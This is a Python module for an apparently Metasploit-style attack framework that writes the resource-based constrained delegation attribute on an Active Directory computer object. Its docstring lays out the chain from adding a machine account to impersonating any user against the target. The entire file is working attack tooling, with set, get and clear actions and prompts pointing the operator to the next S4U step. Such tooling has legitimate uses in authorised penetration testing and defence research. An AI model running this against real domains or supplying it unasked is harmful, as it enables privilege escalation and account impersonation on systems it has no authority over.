"""Resource-based constrained delegation: write the target's RBCD SD.

RBCD flips constrained delegation around: the TARGET says who may
impersonate against it, via msDS-AllowedToActOnBehalfOfOtherIdentity
holding a security descriptor with the principal's SID. If you can write
that attribute (you own the target, or hold GenericWrite/WriteProperty),
you don't need an admin's constrained-delegation config — you make your
own. The full chain:

  add_computer (or any controlled account) -> rbcd set TARGET -> s4u
  with the machine's password -> impersonate anyone to the target

Actions: set (write the SD naming PRINCIPAL_SID), get (parse the
current SD — presence + SIDs), clear (remove the attribute).

PLATFORM NOTE: on Samba the attribute is system-only — LDAP writes are
refused with constraintViolation, and its 4.17 KDC doesn't implement
the RBCD check at all (anvil hit the same walls). Both denials are
reported plainly; on a Windows DC everything here works.
"""

from core.module import AuxiliaryModule
from core.options import OptAddress, OptString

try:
    from impacket.ldap import ldap as impacket_ldap
    from impacket.ldap import ldapasn1, ldaptypes
except ImportError:
    impacket_ldap = None  # console gates run() on requirements

RBCD_ATTR = "msDS-AllowedToActOnBehalfOfOtherIdentity"


def sddl_for(principal_sid):
    """The RBCD SDDL: grant PRINCIPAL full rights over the SD."""
    return ("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + principal_sid + ")")


def parse_sids_from_sd(raw):
    """SIDs out of a raw security descriptor, via impacket's parser."""
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw)
    sids = []
    if sd["Dacl"] is not None:
        for ace in sd["Dacl"].aces:
            try:
                sids.append(ace["Ace"]["Sid"].formatCanonical())
            except Exception:
                continue
    return sids


class Rbcd(AuxiliaryModule):
    name = "RBCD (resource-based delegation write)"
    description = """
        Writes msDS-AllowedToActOnBehalfOfOtherIdentity on TARGET —
        the resource-based constrained delegation primitive. ACTION set
        names PRINCIPAL_SID (a machine account from add_computer, or any
        controlled SID), get parses the current SD, clear removes it.
        Requires write access to the target (owner / GenericWrite).
        Follow with s4u using the principal's password. On Samba the
        attribute is system-only — set/clear report that cleanly.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Domain controller"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain, e.g. forge.local"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="User with write access to TARGET"))
        self.options.add(OptString("PASSWORD", required=True, description="Password"))
        self.options.add(OptString("ACTION", default="set",
                                   description="set | get | clear"))
        self.options.add(OptString("TARGET", required=True,
                                   description="Target DN or sAMAccountName "
                                               "(e.g. WS01$)"))
        self.options.add(OptString("PRINCIPAL_SID", default="",
                                   description="SID allowed to delegate "
                                               "(required for set)"))

    def run(self):
        host = str(self.get_option("RHOSTS")).split(",")[0].strip()
        domain = str(self.get_option("DOMAIN"))
        user = str(self.get_option("USERNAME"))
        password = str(self.get_option("PASSWORD"))
        action = str(self.get_option("ACTION")).lower()
        target = str(self.get_option("TARGET"))
        principal_sid = str(self.get_option("PRINCIPAL_SID") or "").strip()

        if action not in ("set", "get", "clear"):
            self.print_error("ACTION must be set | get | clear")
            return
        if action == "set" and not principal_sid:
            self.print_error("ACTION set needs PRINCIPAL_SID")
            return

        try:
            conn = impacket_ldap.LDAPConnection(f"ldap://{host}")
            conn.login(user, password, domain)
        except Exception as e:
            self.print_error(f"{host}: LDAP bind failed - {e}")
            return

        dn = self._resolve_dn(conn, domain, target, host)
        if dn is None:
            return
        self.print_debug(f"{host}: target dn: {dn}")

        if action == "set":
            self._set(conn, dn, principal_sid, host, target)
        elif action == "clear":
            self._clear(conn, dn, host, target)
        self._get(conn, dn, host, target)

    def _resolve_dn(self, conn, domain, target, host):
        if target.upper().startswith("CN="):
            return target
        for packet in conn.search(
                searchBase=",".join(f"DC={p}" for p in domain.split(".")),
                searchFilter=f"(sAMAccountName={target})",
                attributes=["objectClass"]):
            if isinstance(packet, ldapasn1.SearchResultEntry):
                return str(packet["objectName"])
        self.print_error(f"{host}: {target} not found")
        return None

    def _set(self, conn, dn, principal_sid, host, target):
        try:
            conn.modify(dn, {RBCD_ATTR: [(impacket_ldap.MODIFY_REPLACE,
                                          [sddl_for(principal_sid).encode()])]})
        except Exception as e:
            message = str(e)
            if "constraintViolation" in message:
                self.print_error(
                    f"{host}: {RBCD_ATTR} is system-only on this DC "
                    f"(Samba — Windows DCs accept this write)")
            else:
                self.print_error(f"{host}: RBCD write failed - {e}")
            return
        self.print_good(f"{host}: {target} now allows {principal_sid} "
                        f"to delegate to it")
        self.print_status("next: s4u with the principal's password "
                          "against this target's SPNs")

    def _clear(self, conn, dn, host, target):
        try:
            conn.modify(dn, {RBCD_ATTR: [(impacket_ldap.MODIFY_DELETE, [])]})
        except Exception as e:
            message = str(e)
            if "constraintViolation" in message:
                self.print_error(
                    f"{host}: {RBCD_ATTR} is system-only on this DC "
                    f"(Samba — Windows DCs accept this write)")
            else:
                self.print_error(f"{host}: RBCD clear failed - {e}")
            return
        self.print_good(f"{host}: RBCD cleared on {target}")

    def _get(self, conn, dn, host, target):
        # presence first (binary SD survives the codec via raw bytes when
        # asked for explicitly; impacket's LDAP codec dies DECODING this
        # attribute in a normal search — ask for it raw and parse it)
        found = False
        for packet in conn.search(searchBase=dn, scope=0,
                                  searchFilter=f"({RBCD_ATTR}=*)",
                                  attributes=[RBCD_ATTR]):
            if not isinstance(packet, ldapasn1.SearchResultEntry):
                continue
            for attr in packet["attributes"]:
                if str(attr["type"]) != RBCD_ATTR:
                    continue
                found = True
                raw = bytes(attr["vals"][0])
                try:
                    sids = parse_sids_from_sd(raw)
                except Exception as e:
                    self.print_error(f"{host}: SD parse failed - {e}")
                    sids = []
                if sids:
                    for sid in sids:
                        self.print_status(f"{host}: {target} allows {sid}")
                else:
                    self.print_status(f"{host}: {target} has an RBCD SD "
                                      f"(no SIDs parsed)")
        if not found:
            self.print_line(f"[-] {host}: no RBCD configured on {target}")
